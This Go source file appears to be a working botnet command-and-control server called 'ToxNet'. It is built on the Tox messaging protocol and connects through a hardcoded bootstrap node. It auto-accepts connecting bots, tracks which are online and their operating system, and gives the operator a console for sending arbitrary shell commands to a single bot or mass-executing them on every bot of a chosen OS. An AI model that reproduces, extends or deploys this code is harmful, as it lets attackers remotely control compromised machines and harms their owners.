package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"

	"time"

	tox "github.com/TokTok/go-toxcore-c"
)

func init() {
	log.SetFlags(log.Flags() | log.Lshortfile)
}

var server = []interface{}{
	"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
}

var fname = "./server.data"
var nickPrefix = "Odin"
var statusText = "Revered immortal."

var fv []uint32     // Bots list
var online []string // Online bots list

var commandHistory []string

// Color section
var colorReset = "\033[0m"
var colorRed = "\033[31m"
var colorGreen = "\033[32m"
var colorYellow = "\033[33m"
var colorBlue = "\033[34m"
var colorPurple = "\033[35m"
var colorCyan = "\033[36m"
var colorWhite = "\033[37m"
var colorBlack = "\033[30m"
var colorGrey = "\033[31m"

// ListBots (Return text bool, id return type)
func ListBots(t *tox.Tox, print string) []uint32 {

	// Pull bots
	fv := t.SelfGetFriendList()
	// If print doesn't equal none. Check if it should print all or the online bots.
	if print != "none" {
		if print == "all" {
			fmt.Println(string(colorPurple), "\n\tBots:", string(colorReset))
			fmt.Println(string(colorBlue))
			for _, fno := range fv {
				fid, err := t.FriendGetPublicKey(fno)
				if err != nil {
					log.Println(err)
				}
				fmt.Println("\t\t[ ID:", fno, "]", fid)
			}
			fmt.Println(string(colorReset))
		} else if print == "online" {
			if len(online) > 0 {
				fmt.Println(string(colorPurple), "\n\tOnline bots:", string(colorReset))
				fmt.Println(string(colorGreen))
				for _, online := range online {
					values := strings.Fields(online)
					fno, err := strconv.Atoi(values[0])
					if err != nil {
						log.Println(err)
					}
					fid, err := t.FriendGetPublicKey(uint32(fno))
					if err != nil {
						log.Println(err)
					}
					os := values[1]
					fmt.Println("\n\t\t[ ID:", fno, "]", fid, "@", os)
				}
			} else {
				fmt.Println(string(colorPurple), "\nBot(s) offline... Please wait.\n", string(colorReset))
			}
		}
	}

	return fv
}

// Find - Finding duplicates in online bots array
func Find(slice []string, val string) (int, bool) {
	for i, item := range slice {
		stringItem := fmt.Sprint(item)
		if stringItem == val {
			return i, true
		}
	}
	return -1, false
}

// SendMessage - message
func SendMessage(t *tox.Tox, friendNumber uint32, message string) error {
	_, err := t.FriendSendMessage(friendNumber, message)
	if err != nil {
		return err
	}
	return nil
}

// showC2 - Display a banner of the C2 Tox ID
func showC2(toxid string) {

	fmt.Println(string(colorYellow), `
	 _____                 __       _   
	/__   \ ___ __  __  /\ \ \ ___ | |_ 
	  / /\// _ \\ \/ / /  \/ // _ \| __|
	 / /  | (_) |>  < / /\  /|  __/| |_ 
	 \/    \___//_/\_\\_\ \/  \___| \__|
	`, string(colorReset))

	fmt.Println("")
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorRed), "C2:", toxid, string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("")
}

// helpCommands - Print commands with examples
func helpCommands(help string) {
	fmt.Println(string(colorPurple), "\n\tExamples:", help, string(colorReset))
	if help == "" {
		fmt.Println(string(colorYellow))
		fmt.Println("\t\tbots - Displays examples of controlling bots")
		fmt.Println("\t\tcommands - Display previous commands")
		fmt.Println("\t\tclear - Clear the console")
		fmt.Println(string(colorReset))
	} else if help == "bots" {
		fmt.Println(string(colorYellow))
		fmt.Println("\t\tbots list all - List all bots")
		fmt.Println("\t\tbots list amount - List total amount of bots")
		fmt.Println("\t\tbots list online - List online bots")
		fmt.Println("\t\tbots interact <id> ! ls -lah - Execute shell command")
		fmt.Println("\t\tbots interact * ! ls -lah - Mass execute")
		fmt.Println(string(colorReset))
	}
}

func main() {

	opt := tox.NewToxOptions()
	if tox.FileExist(fname) {
		data, err := ioutil.ReadFile(fname)
		if err != nil {
			log.Println(err)
		} else {
			opt.Savedata_data = data
			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
		}
	}

	opt.Tcp_port = 33445
	var t *tox.Tox
	for i := 0; i < 5; i++ {
		t = tox.NewTox(opt)
		if t == nil {
			opt.Tcp_port++
		} else {
			break
		}
	}

	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
	if err != nil {
		log.Println("bootstrap:", r, err, r2)
	}

	toxid := t.SelfGetAddress()

	defaultName := t.SelfGetName()
	humanName := nickPrefix + toxid[0:5]
	if humanName != defaultName {
		t.SelfSetName(humanName)
	}
	humanName = t.SelfGetName()

	defaultStatusText, err := t.SelfGetStatusMessage()
	if defaultStatusText != statusText {
		t.SelfSetStatusMessage(statusText)
	}

	err = t.WriteSavedata(fname)
	if err != nil {
		log.Println(err)
	}

	// Show C2 address
	showC2(toxid)

	// Server load, pull all bots
	fv = ListBots(t, "none")
	fmt.Println(string(colorPurple))
	fmt.Println("\tTotal bots:", len(fv))
	fmt.Println(string(colorReset))

	// Console for commands
	go func() {

		reader := bufio.NewReader(os.Stdin)

		for {
			fmt.Print(string(colorGreen), "\n-> ", string(colorReset), string(colorGrey))
			text, _ := reader.ReadString('\n')
			text = strings.Replace(text, "\n", "", -1)

			// Append every input to the commands array
			commandHistory = append(commandHistory, text)

			// If input equals commands, print each command
			if text == "commands" {
				fmt.Println(string(colorPurple), "\n\n\tHistory:", string(colorReset))
				for _, command := range commandHistory {
					fmt.Println(string(colorYellow), "\t\t", command, string(colorReset))
				}
			}
			fmt.Println(string(colorReset))

			// If the command starts with bots
			if strings.HasPrefix(text, "bots") {
				// Split command every space and turn into array.
				args := strings.Fields(text)
				// If there is more or 4 arguments in the command.
				if len(args) >= 3 {
					// If the 2nd argument in the command is list.
					if args[1] == "list" {
						// If the 3rd argument is all. Print all bots.
						if args[2] == "all" {
							fv = ListBots(t, "all")
							// If the 3rd argument is amount. Print amount of bots.
						} else if args[2] == "amount" {
							fv = ListBots(t, "none")
							fmt.Println(string(colorPurple))
							fmt.Println("\tTotal bots:", len(fv))
							fmt.Println(string(colorReset))
							// If the 3rd argument is online. Print online bots.
						} else if args[2] == "online" {
							fv = ListBots(t, "online")
						}
						// If the 2nd argument in the command is interact.
					} else if args[1] == "interact" {
						// If the ID isn't all. Then execute for that specific ID.
						if args[2] != "*" {
							// Convert ID to int
							botid, err := strconv.Atoi(args[2])
							if err != nil {
								log.Println(err)
							}
							// If the bot ID is in the the bots list.
							if botid < len(fv) {
								// Send the command to the bot.
								commands := args[3:len(args)]
								command := strings.Join(commands, " ")
								err = SendMessage(t, fv[botid], command)
								if err != nil {
									fmt.Println("Bot offline...")
								}
							}
						} else {
							// Mass execute command
							for _, online := range online {
								values := strings.Fields(online)
								fno, err := strconv.Atoi(values[0])
								if err != nil {
									log.Println(err)
								}
								if err != nil {
									log.Println(err)
								}
								os := values[1]
								commands := args[4:len(args)]
								command := strings.Join(commands, " ")
								if string(args[3]) == os {
									SendMessage(t, fv[fno], command)
								}
							}
						}
					}
				} else {
					// If there was not enough arguments, then show the examples.
					helpCommands("bots")
				}
				// If the command is help
			} else if text == "help" {
				// Show all help commands
				helpCommands("")
			} else if text == "clear" {
				// Clear console
				fmt.Print("\033[H\033[2J")
				showC2(toxid)
			} else if text == "exit" {
				// Exit C2
				fmt.Println("\tGoodbye!")
				os.Exit(1)
			}
		}
	}()

	// Auto accept
	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
		// When a bot adds the C2. Add them back with no message.
		num, err := t.FriendAddNorequest(friendId)
		fv = ListBots(t, "none")

		if err != nil {
			log.Println("on friend request:", num, err)
		}
		if num < 100000 {
			t.WriteSavedata(fname)
		}
	}, nil)

	// On message
	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
		// If incoming message starts with update
		if strings.HasPrefix(message, "update") {
			// Split the incoming update message
			args := strings.Fields(message)
			// Return friendNumber as string
			str := fmt.Sprint(friendNumber)
			// Make a string with friendNumber and operating system
			foundBot := str + " " + args[1]
			// Look for that string in the online array
			_, found := Find(online, foundBot)
			// If it cannot be found
			if !found {
				// Append the bot to the online array
				online = append(online, foundBot)
			}

		} else {
			// If the response wasn't update. Print the response.
			fmt.Print("Output:", friendNumber, "\n\n", message, string(colorGreen), "\n\n-> ", string(colorRed))
		}

	}, nil)

	// toxcore loops
	shutdown := false
	loopc := 0
	itval := 0
	for !shutdown {
		iv := t.IterationInterval()
		if iv != itval {
			itval = iv
		}

		t.Iterate()
		loopc++
		time.Sleep(1000 * 50 * time.Microsecond)
	}

	t.Kill()

}

func makekey(no uint32, a0 interface{}, a1 interface{}) string {
	return fmt.Sprintf("%d_%v_%v", no, a0, a1)
}

func init() {
	tox.KeepPkg()
}
